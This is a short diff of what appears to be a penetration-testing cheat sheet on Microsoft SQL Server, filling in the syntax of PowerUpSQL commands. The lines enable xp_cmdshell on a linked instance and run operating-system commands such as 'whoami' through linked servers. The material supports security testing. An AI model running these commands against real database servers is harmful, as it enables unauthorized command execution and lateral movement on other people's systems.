@@ -614,8 +614,8 @@ Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance
 
 #### Execute commands
 ```
-Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
-Invoke-SQLOSCmd (find out syntax)
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
+Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
 ```
 
 #### Execute command through links
